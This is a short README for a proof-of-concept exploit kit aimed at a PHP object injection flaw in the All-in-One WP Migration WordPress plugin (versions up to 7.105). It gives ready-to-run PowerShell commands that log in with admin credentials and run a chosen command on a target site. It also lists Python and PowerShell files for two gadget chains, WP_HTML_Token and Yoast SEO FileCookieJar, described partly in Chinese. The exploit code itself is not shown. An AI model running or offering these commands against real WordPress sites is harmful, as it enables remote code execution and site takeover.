# All-in-One WP Migration <= 7.105 PHP Object Injection PoC

## Usage

```powershell
# WP_HTML_Token (WordPress 6.4.0-6.4.1)
.\exploit_fullauto.ps1 -Target "http://target/wordpress" -User admin -Pass pass -Cmd "whoami"

# Yoast FileCookieJar (任意版本 + Yoast SEO)
.\exploit_fullauto_yoast.ps1 -Target "http://target/wordpress" -User admin -Pass pass
```

## Files

| File | Description |
|------|-------------|
| `exploit.py` | 核心库 + WP_HTML_Token gadget |
| `exploit_fullauto.ps1` | WP_HTML_Token 全自动利用 |
| `exploit_yoast.py` | Yoast SEO FileCookieJar gadget |
| `exploit_fullauto_yoast.ps1` | Yoast SEO 全自动利用 |

## Dependencies

- Python 3.x
- PowerShell + curl.exe
